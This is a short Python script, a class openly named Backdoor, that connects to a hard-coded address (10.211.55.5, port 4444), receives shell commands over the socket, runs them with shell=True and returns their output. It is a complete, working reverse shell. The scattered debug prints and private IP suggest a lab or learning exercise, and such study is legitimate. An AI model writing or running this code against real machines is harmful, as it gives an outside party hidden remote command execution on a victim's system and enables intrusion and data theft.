import subprocess, sys, socket, json


class Backdoor:
    def __init__(self,ip,port):
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.s.connect((str(ip),port))
        except ConnectionRefusedError:
            sys.exit()
        
    
    def executeCmd(self,cmd):
        cmd = subprocess.check_output(cmd,shell=True)
        return cmd
    
    
    def sendStream(self,data):
        jsData = json.dumps(data)
        self.s.send(str(jsData).encode('utf-8'))


    def recvStream(self):
        jsData = self.s.recv(1024)
        return json.loads(jsData)


    def run(self):
        while True:
            print('run1')
            cmdIn = self.recvStream()
            print(cmdIn)
            print('run1')
            #cmdIn = cmdIn.decode()
            #print(cmdIn)
            try:
                print('run3_TRY')
                cmdOut = self.executeCmd(cmdIn)
                print('run4_TRY')
                print(cmdOut)
                cmdOut = cmdOut.decode('utf-8')
                print(cmdOut)
                self.sendStream(cmdOut)
                print('run5_TRYPOSTSEND')
            except subprocess.CalledProcessError:
                self.sendStream('Subprocess Error, shell command not accepted by target')


backdoor = Backdoor('10.211.55.5',4444)


try:
    backdoor.run()
except KeyboardInterrupt:
    sys.exit()
except ConnectionAbortedError:
    sys.exit()
except ConnectionResetError:
    sys.exit()
except ConnectionRefusedError:
    sys.exit()

